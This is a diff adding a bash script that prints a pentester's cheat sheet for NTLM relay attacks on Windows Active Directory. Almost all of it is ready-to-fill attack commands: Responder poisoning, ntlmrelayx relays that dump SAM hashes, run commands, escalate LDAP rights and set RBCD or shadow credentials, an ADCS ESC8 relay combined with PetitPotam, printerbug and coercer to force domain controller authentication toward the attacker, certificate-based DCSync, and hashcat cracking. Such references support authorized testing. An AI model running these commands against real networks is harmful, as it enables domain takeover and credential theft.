@@ -1,0 +1,60 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── NTLM RELAY (Responder + ntlmrelayx) ──────────────${NC}"
+printf "\n"
+
+echo -e "  Note: Pre-condition: SMB signing disabled on target (most workstations by default)."
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Step-by-Step ─────────────────────────────────────${NC}"
+printf "\n"
+echo -e "  Note: 1. Generate relay target list:"
+echo -e "  ${GREEN}nxc smb <SUBNET>/24 --gen-relay-list relay_targets.txt${NC}"
+printf "\n"
+echo -e "  Note: 2. Disable SMB + HTTP in Responder (relaying, not capturing):"
+echo -e "  ${GREEN}sed -i 's/SMB = On/SMB = Off/' /PATH/TO/Responder/Responder.conf${NC}"
+echo -e "  ${GREEN}sed -i 's/HTTP = On/HTTP = Off/' /PATH/TO/Responder/Responder.conf${NC}"
+printf "\n"
+echo -e "  Note: 3. Start Responder (LLMNR/NBT-NS poisoning):"
+echo -e "  ${GREEN}python3 Responder.py -I eth0 -rdwv${NC}"
+printf "\n"
+echo -e "  Note: 4. Start ntlmrelayx:"
+echo -e "  ${GREEN}ntlmrelayx.py -tf relay_targets.txt -smb2support${NC}              # dump SAM"
+echo -e "  ${GREEN}ntlmrelayx.py -t smb://<TARGET> -smb2support -c 'whoami'${NC}      # exec command"
+echo -e "  ${GREEN}ntlmrelayx.py -t ldap://<DC> --remove-mic --escalate-user <USER>${NC}"
+echo -e "  ${GREEN}ntlmrelayx.py -t ldap://<DC> --delegate-access${NC}                # RBCD"
+echo -e "  ${GREEN}ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01\$'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── NTLM Relay to ADCS (ESC8) ────────────────────────${NC}"
+echo -e "  Note: If ADCS HTTP enrollment endpoint exists (http://<CA>/certsrv/):"
+echo -e "  ${GREEN}impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support${NC}"
+printf "\n"
+echo -e "  Note: Then coerce DC auth:"
+echo -e "  ${GREEN}coercer coerce --target-ip <DC_IP> --l <KALI_IP> -u <USER> -p <PASS> --filter-method-name EfsRpcAddUsersToFile${NC}"
+printf "\n"
+echo -e "  Note: Result: DC08\$.pfx -> PKINIT -> NT hash -> DCSync"
+echo -e "  ${GREEN}certipy-ad auth -pfx DC08\$.pfx -dc-ip <DC_IP>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Force NTLM Auth (Coercion Methods) ───────────────${NC}"
+echo -e "  ${GREEN}coercer coerce --target-ip <TARGET> --l <KALI_IP> -u <USER> -p <PASS>${NC}  # all methods"
+echo -e "  ${GREEN}PetitPotam.py <KALI_IP> <TARGET_IP>${NC}              # EfsRpc (may be patched)"
+echo -e "  ${GREEN}printerbug.py DOMAIN/user:pass@<TARGET> <KALI_IP>${NC}  # SpoolSample"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Capture Hash Only (no relay) ─────────────────────${NC}"
+echo -e "  Note: Leave SMB/HTTP = On in Responder for hash capture:"
+echo -e "  ${GREEN}python3 Responder.py -I eth0 -rdwv${NC}"
+echo -e "  ${GREEN}hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
